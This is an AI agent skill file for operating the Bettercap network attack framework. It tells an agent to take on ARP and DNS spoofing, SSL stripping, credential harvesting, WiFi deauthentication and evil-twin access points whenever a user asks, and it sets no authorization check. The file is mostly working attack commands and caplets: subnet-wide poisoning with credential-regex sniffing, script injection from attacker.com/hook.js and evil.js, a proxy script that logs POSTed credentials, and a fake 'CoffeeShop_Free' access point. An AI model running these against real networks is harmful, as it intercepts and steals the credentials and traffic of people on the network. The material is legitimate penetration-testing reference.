---
name: bettercap
description: >
  Operate and script Bettercap — a comprehensive network attack and monitoring framework.
  Use when working with bettercap/bettercap, when the user needs to perform ARP spoofing,
  DNS spoofing, SSL stripping, credential sniffing, WiFi attacks (deauth, handshake capture,
  evil twin), BLE enumeration, HID injection, or man-in-the-middle workflows. Covers
  installation, interactive REPL, caplets, all major modules, REST API, web UI, and
  comparison with Ettercap.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/bettercap/bettercap
  language: Go
---

# bettercap Agent Skill

## When to Use This Skill

Use this skill when:
- Performing ARP spoofing or DNS spoofing on a local network segment
- Intercepting and modifying HTTP/HTTPS traffic (MITM)
- Capturing WiFi WPA2 handshakes or running deauthentication attacks
- Enumerating Bluetooth Low Energy devices
- Running HID (keyboard/mouse) injection attacks
- The user asks about bettercap, network sniffing, or credential harvesting
- Automating network attacks via caplet scripts
- Accessing the REST API or web UI for headless operation

## What Bettercap Does

Bettercap is a full-featured network attack framework that combines ARP/DNS spoofing, HTTP/HTTPS
proxying, packet sniffing, WiFi 802.11 frame injection, BLE scanning, and HID attacks into a
single interactive tool with a DSL-based scripting system (caplets). It replaces and extends
Ettercap with a modular Go architecture, REST API, and real-time web UI. It is the go-to tool
for LAN-based MITM attacks, WiFi assessments, and IoT/BLE recon.

## Installation

### Debian / Kali / Ubuntu
```bash
# Official install script (recommended — handles libpcap, libnetfilter dependencies)
sudo apt install bettercap        # Kali repos
# or
sudo apt install libpcap-dev libnetfilter-queue-dev
go install github.com/bettercap/bettercap@latest

# Pre-built binary
VERSION=2.32.0
curl -sSL https://github.com/bettercap/bettercap/releases/download/v${VERSION}/bettercap_linux_amd64_v${VERSION}.zip \
  -o bettercap.zip && unzip bettercap.zip && sudo mv bettercap /usr/local/bin/
```

### macOS
```bash
brew install bettercap
```

### Docker
```bash
docker pull bettercap/bettercap
docker run --privileged --net=host -it bettercap/bettercap -iface eth0
# --privileged and --net=host required for raw socket / pcap access
```

### Build from source
```bash
sudo apt install libpcap-dev libnetfilter-queue-dev libusb-1.0-0-dev
git clone https://github.com/bettercap/bettercap && cd bettercap
go build -o bettercap . && sudo mv bettercap /usr/local/bin/

# Install caplets (scripting library)
sudo bettercap -eval "caplets.update; quit"
```

## Core Concepts

### Architecture
- **Modules**: independent components (net.probe, arp.spoof, http.proxy, etc.)
- **Session**: global state — interface, gateway, targets
- **Caplets**: `.cap` script files — sequences of bettercap commands
- **Events**: real-time event bus; modules emit events consumed by other modules
- **REST API**: JSON API for remote control and headless operation

### Starting bettercap
```bash
# Interactive REPL (most common during engagements)
sudo bettercap -iface eth0

# Run a caplet directly
sudo bettercap -iface eth0 -caplet http-ui

# Evaluate commands from string
sudo bettercap -iface eth0 -eval "net.probe on; net.sniff on"

# Quiet mode (suppress banner)
sudo bettercap -iface eth0 -no-colors -eval "..."

# List available modules
bettercap -list-modules
```

## Module Reference

### net.probe — host discovery
```
net.probe on                  # Start active host discovery (ARP + mDNS + NBT)
net.probe off
set net.probe.mdns true       # Enable mDNS probing
set net.probe.nbns true       # Enable NetBIOS name service probing
set net.probe.upnp true       # Enable UPnP probing
set net.probe.wsd  true       # Enable WSD probing
```

### net.sniff — packet capture
```
net.sniff on
net.sniff off
set net.sniff.verbose true           # Print full packet details
set net.sniff.local true             # Capture local traffic too
set net.sniff.filter "tcp port 80"   # BPF filter
set net.sniff.output /tmp/cap.pcap   # Save to pcap file
set net.sniff.regexp "password"      # Regex filter on content
```

### arp.spoof — ARP poisoning (MITM gateway)
```
set arp.spoof.targets 192.168.1.50        # Target a single host
set arp.spoof.targets 192.168.1.0/24      # Entire subnet
set arp.spoof.fullduplex true             # Spoof both directions (target + gateway)
set arp.spoof.internal true               # Spoof between hosts (not just to gateway)
arp.spoof on
arp.spoof off
```

### dns.spoof — DNS response poisoning
```
set dns.spoof.domains example.com,*.evil.com
set dns.spoof.address 192.168.1.100    # Where to redirect queries
set dns.spoof.all true                 # Spoof ALL DNS queries (not just matching domains)
dns.spoof on
dns.spoof off
```

### http.proxy — HTTP interception and injection
```
set http.proxy.port 8080
set http.proxy.address 0.0.0.0
http.proxy on
http.proxy off

# JavaScript injection (inject a <script> tag into every HTML page)
set http.proxy.injectjs "alert('pwned')"
set http.proxy.injectjs https://attacker.com/hook.js

# Custom JS module (caplet or inline)
set http.proxy.script /path/to/proxy.js

# HTTP module scripting API (proxy.js)
# function onRequest(req) { ... }
# function onResponse(req, res) { ... }
```

### https.proxy — TLS interception (SSL strip + MITM)
```
set https.proxy.port 8083
set https.proxy.certificate /path/to/cert.pem
set https.proxy.key /path/to/key.pem
https.proxy on
https.proxy off

# Inject JS into HTTPS pages
set https.proxy.injectjs https://attacker.com/hook.js
https.proxy on
```

### http.server — serve files from bettercap
```
set http.server.path /var/www/html
set http.server.port 8080
http.server on
```

### hstshijack — HTTPS downgrade / HSTS bypass
```
# Built-in caplet
sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
# Rewrites HTTPS links in HTML to HTTP + handles HSTS exceptions
```

## WiFi Module

```bash
sudo bettercap -iface wlan0mon    # Requires monitor mode interface

# Discovery
wifi.recon on
wifi.show                         # List discovered APs and clients

# Target a specific BSSID
set wifi.recon.channel 6          # Lock to channel 6
wifi.recon on

# Deauthentication (802.11 deauth frames → disconnect clients)
wifi.deauth e0:xx:xx:xx:xx:xx     # Deauth specific client MAC
wifi.deauth ff:ff:ff:ff:ff:ff     # Broadcast deauth (deauth all clients from AP)
# Note: must be targeting an AP (BSSID set correctly)

# WPA2 handshake capture
# After deauth, clients reconnect and bettercap captures the 4-way handshake
# Handshake saved to /tmp/ by default
set wifi.handshakes.file /tmp/handshakes.pcap
wifi.recon on

# Evil Twin AP (rogue access point)
set wifi.ap.ssid "CoffeeShop_Free"
set wifi.ap.bssid de:ad:be:ef:ca:fe
set wifi.ap.channel 6
set wifi.ap.encryption false       # Open network
wifi.ap on

# Probe requests monitoring (passive — who is looking for what)
wifi.recon on
# Events: wifi.client.probe — shows device + SSID it's probing for
```

## BLE Module

```bash
sudo bettercap -iface eth0   # BLE uses system BT adapter, not network iface

# Enumerate BLE devices
ble.recon on
ble.show                      # List discovered BLE devices with RSSI

# Connect and enumerate GATT services/characteristics
ble.enum AA:BB:CC:DD:EE:FF

# Read a specific GATT characteristic
ble.read AA:BB:CC:DD:EE:FF 0x0025

# Write a GATT characteristic (HID injection via BLE)
ble.write AA:BB:CC:DD:EE:FF 0x0025 DEADBEEF
```

## HID Module (USB rubber ducky style injection)

```bash
# Requires compatible HID device (e.g., Arduino/USB dongle supported by bettercap)
hid.recon on
hid.show

# Inject keystrokes (US layout by default)
hid.inject AA:BB:CC:DD:EE:FF US "cmd /c whoami"

# Inject from a DuckyScript-like script
set hid.inject.file /path/to/payload.txt
```

## REST API and Web UI

```bash
# Start with REST API enabled
set api.rest.username admin
set api.rest.password admin
set api.rest.port 8083
api.rest on

# Web UI (built-in dashboard at http://localhost:8083)
sudo bettercap -iface eth0 -caplet http-ui

# REST API endpoints
GET  /api/session              # Session info
GET  /api/session/modules      # Module list and status
GET  /api/events               # Event stream (SSE)
POST /api/session              # Execute a command: {"cmd": "arp.spoof on"}

# Example: trigger command via curl
curl -s -u admin:admin \
  -X POST http://localhost:8083/api/session \
  -H "Content-Type: application/json" \
  -d '{"cmd": "net.probe on"}'

# Stream events
curl -s -u admin:admin http://localhost:8083/api/events
```

## Caplets (Scripting)

Caplets are `.cap` files containing sequences of bettercap commands, comments, and control flow.

### Basic caplet: MITM + credential sniff
```caplet
# mitm-sniff.cap
set $ {bold}{fw}bettercap{reset} > {bold}{iface.name}{reset} : {bold}{net.address}{reset}
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on
set net.sniff.verbose false
set net.sniff.regexp "(?i)(user|pass|login|token|auth)"
```

```bash
sudo bettercap -iface eth0 -caplet mitm-sniff.cap
```

### Caplet: HTTP proxy with JS injection
```caplet
# inject.cap
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.50
arp.spoof on
set http.proxy.injectjs https://192.168.1.100/hook.js
http.proxy on
```

### Built-in caplets (installed via caplets.update)
```
http-ui       — Web dashboard
https-ui      — Web dashboard over HTTPS
hstshijack    — HSTS bypass + SSL strip
arp.spoof     — Quick ARP spoof
net.recon     — Discovery + show
beef-active   — Inject BeEF hook
```

```bash
# List installed caplets
ls $(bettercap -eval "caplets.show; quit" 2>&1 | grep dir | awk '{print $NF}')

# Update caplets library
sudo bettercap -eval "caplets.update; quit"
```

## Man-in-the-Middle Workflow

### Full LAN MITM + Credential Capture
```bash
# 1. Enable IP forwarding (required — otherwise you black-hole traffic)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# 2. Start bettercap
sudo bettercap -iface eth0

# 3. In the REPL:
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on
set net.sniff.verbose false
http.proxy on
set http.proxy.injectjs https://192.168.1.100/evil.js
events.stream on    # watch events in real time
```

### SSL Stripping
```bash
# iptables redirect port 80 → bettercap's proxy
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

set arp.spoof.fullduplex true
arp.spoof on
http.proxy on       # Intercepts plain HTTP
# hstshijack caplet handles HTTPS downgrade
sudo bettercap -caplet hstshijack/hstshijack
```

## Advanced Techniques

### Proxy script for credential extraction (JavaScript module)
```javascript
// creds.js — runs inside bettercap's http.proxy JS engine
function onRequest(req) {
    if (req.Method === "POST") {
        var body = req.ReadBody();
        if (body.match(/(user|pass|email|login)/i)) {
            log("[CRED] " + req.Hostname + " | " + body);
        }
    }
}
```
```
set http.proxy.script creds.js
http.proxy on
```

### Headless operation via REST API (from Python)
```python
import requests, base64
creds = base64.b64encode(b"admin:admin").decode()
headers = {"Authorization": f"Basic {creds}", "Content-Type": "application/json"}
base = "http://127.0.0.1:8083"
requests.post(f"{base}/api/session", json={"cmd": "arp.spoof on"}, headers=headers)
```

## Comparison with Ettercap

| Feature | Bettercap | Ettercap |
|---|---|---|
| Language | Go | C |
| Active development | Yes | Minimal |
| WiFi attacks | Full (deauth, evil twin) | No |
| BLE/HID | Yes | No |
| REST API / Web UI | Yes | No |
| Caplet scripting | Yes (own DSL) | Etter.filter scripts |
| SSL interception | Yes (https.proxy) | Yes (sslstrip plugin) |
| Docker support | Yes | Partial |
| Plugin architecture | Modules | Plugins |
| Performance | High | Moderate |

## Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| No hosts discovered | Interface wrong / not promiscuous | Verify iface, use `net.probe on` |
| Traffic not flowing after spoof | IP forwarding off | `echo 1 > /proc/sys/net/ipv4/ip_forward` |
| HTTPS fails to intercept | Cert not trusted by browser | Install bettercap CA in OS/browser store |
| WiFi module errors | Interface not in monitor mode | `airmon-ng start wlan0` first |
| REST API connection refused | api.rest not started | Run `api.rest on` in REPL |
| Caplet not found | Caplets not installed | `bettercap -eval "caplets.update; quit"` |
| Segfault / crash | libpcap version mismatch | Rebuild from source matching libpcap version |

```bash
# Debug: run with full logging
sudo bettercap -iface eth0 -debug

# Check interface capabilities
sudo bettercap -iface eth0 -eval "net.show; quit"
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
